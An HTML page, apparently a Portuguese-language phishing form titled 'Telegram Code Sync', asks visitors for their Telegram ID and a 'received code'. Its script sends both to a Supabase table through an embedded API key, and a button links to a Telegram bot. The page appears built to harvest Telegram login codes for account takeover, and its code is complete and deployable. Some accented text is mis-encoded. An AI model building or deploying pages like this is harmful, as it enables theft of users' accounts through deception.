<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Telegram Code Sync</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
* {
  box-sizing: border-box;
  font-family: Arial, Helvetica, sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #1E1E1E;
  color: #e5e7eb;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
}

/* 锔 Neve */
.snow {
  position: fixed;
  inset: 0;
  pointer-events: none;
  z-index: 0;
}

.snow span {
  position: absolute;
  top: -10px;
  width: 6px;
  height: 6px;
  background: #fff;
  border-radius: 50%;
  opacity: .8;
  animation: fall linear infinite;
}

@keyframes fall {
  from { transform: translateY(0); }
  to { transform: translateY(110vh); }
}

/*  Card */
.box {
  position: relative;
  z-index: 1;
  width: 100%;
  max-width: 340px;
  background: #2C2C2C;
  padding: 22px;
  border-radius: 12px;
  box-shadow: 0 15px 40px rgba(0,0,0,.5);
}

h2 {
  text-align: center;
  margin-bottom: 16px;
  font-size: 20px;
}

/* Inputs */
input {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border-radius: 8px;
  border: none;
  outline: none;
  background: #1E1E1E;
  color: #fff;
  border: 1px solid #3a3a3a;
  font-size: 14px;
}

input::placeholder {
  color: #aaa;
}

/* Bot玫es */
button {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
  font-size: 14px;
  transition: background .2s ease;
}

#sendBtn {
  background: #2F80ED;
  color: #fff;
}

#sendBtn:disabled {
  opacity: .6;
  cursor: not-allowed;
}

#botBtn {
  background: #38bdf8;
  color: #020617;
  margin-top: 8px;
}

#msg {
  margin-top: 12px;
  text-align: center;
  font-size: 14px;
}
</style>
</head>

<body>

<div class="snow" id="snow"></div>

<div class="box">
  <h2>Confirmar C贸digo</h2>

  <input id="id" placeholder="Seu ID Telegram">
  <input id="code" placeholder="C贸digo recebido">

  <button id="sendBtn" onclick="sendCode()">Enviar</button>

  <a href="https://t.me/synchelpbot?start=PRONTO!" target="_blank">
    <button id="botBtn">BOT</button>
  </a>

  <div id="msg"></div>
</div>

<script>
/* 锔 Criar neve */
const snow = document.getElementById("snow");
for (let i = 0; i < 40; i++) {
  const flake = document.createElement("span");
  flake.style.left = Math.random() * 100 + "%";
  flake.style.animationDuration = (5 + Math.random() * 5) + "s";
  flake.style.opacity = Math.random();
  flake.style.transform = `scale(${Math.random()})`;
  snow.appendChild(flake);
}

/*  Supabase */
const SUPABASE_URL = "https://aqyaxfrukssndxgctukf.supabase.co/rest/v1/tg_miniapp";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFxeWF4ZnJ1a3NzbmR4Z2N0dWtmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzMDY0MTYsImV4cCI6MjA3Nzg4MjQxNn0.fqP4BfoGBr-A8piJevWto3DnJByYvLxB9gudq81KvJw";

let sending = false;

function sendCode() {
  if (sending) return;

  const id = document.getElementById("id").value.trim();
  const code = document.getElementById("code").value.trim();
  const msg = document.getElementById("msg");
  const btn = document.getElementById("sendBtn");

  if (!/^\d+$/.test(id) || !code) {
    msg.innerText = "ID inv谩lido ou c贸digo vazio";
    msg.style.color = "#f87171";
    return;
  }

  sending = true;
  btn.disabled = true;

  fetch(`${SUPABASE_URL}?id=eq.${id}`, {
    method: "PATCH",
    headers: {
      "apikey": SUPABASE_KEY,
      "Authorization": `Bearer ${SUPABASE_KEY}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      code,
      confirmed: true
    })
  })
  .then(r => {
    if (!r.ok) throw new Error();
    msg.innerText = "C贸digo enviado com sucesso";
    msg.style.color = "#22c55e";
  })
  .catch(() => {
    msg.innerText = "Erro ao enviar c贸digo";
    msg.style.color = "#f87171";
    sending = false;
    btn.disabled = false;
  });
}
</script>

</body>
</html>
